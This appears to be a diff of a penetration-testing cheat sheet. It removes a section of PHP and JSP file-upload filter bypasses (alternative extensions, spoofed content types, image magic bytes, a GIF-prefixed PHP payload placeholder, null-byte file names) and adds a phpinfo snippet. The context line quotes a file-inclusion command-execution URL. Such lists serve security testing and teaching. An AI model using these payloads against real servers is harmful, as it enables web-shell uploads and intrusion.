@@ -3179,99 +3179,6 @@ $ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 
 ## PHP
 
-### PHP Upload Filter Bypasses
-
-```c
-.sh
-.cgi
-.inc
-.txt
-.pht
-.phtml
-.phP
-.Php
-.php3
-.php4
-.php5
-.php7
-.pht
-.phps
-.phar
-.phpt
-.pgif
-.phtml
-.phtm
-.php%00.jpeg
-```
-
-### Content-Types
-
-```c
-Content-Type : image/gif
-Content-Type : image/png
-Content-Type : image/jpeg
-```
-
-### Magic Bytes
-
-#### PNG
-
-```c
-\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
-```
-
-#### JPG
-
-```c
-\xff\xd8\xff
-```
-
-#### GIF
-
-```c
-GIF8;
-GIF87a
-```
-
-##### Example
-
-```c
-GIF89a;
-<?php
-  <PAYLOAD>
-?>
-```
-
-### Java Server Pages (JSP) Upload Filter Bypasses
-
-```c
-.MF
-.jspx
-.jspf
-.jsw
-.jsv
-.xml
-.war
-.jsp
-.aspx
-```
-
-### Examples
-
-```c
-<FILE>.php%20
-<FILE>.php%0d%0a.jpg
-<FILE>.php%0a
-<FILE>.php.jpg
-<FILE>.php%00.gif
-<FILE>.php\x00.gif
-<FILE>.php%00.png
-<FILE>.php\x00.png
-<FILE>.php%00.jpg
-<FILE>.php\x00.jpg
-$ mv <FILE>.jpg <FILE>.php\x00.jpg
-```
-
 ### PHP Functions
 
 ```c
@@ -3284,6 +3191,12 @@ $ mv <FILE>.jpg <FILE>.php\x00.jpg
 | shell_exec()   | No              | Yes (string)   | No             |
 | backticks (``) | No              | Yes (string)   | No             |
 +----------------+-----------------+----------------+----------------+
+```
+
+### phpinfo.phar
+
+```c
+<?php phpinfo(); ?>
 ```
 
 ### phpinfo Dump
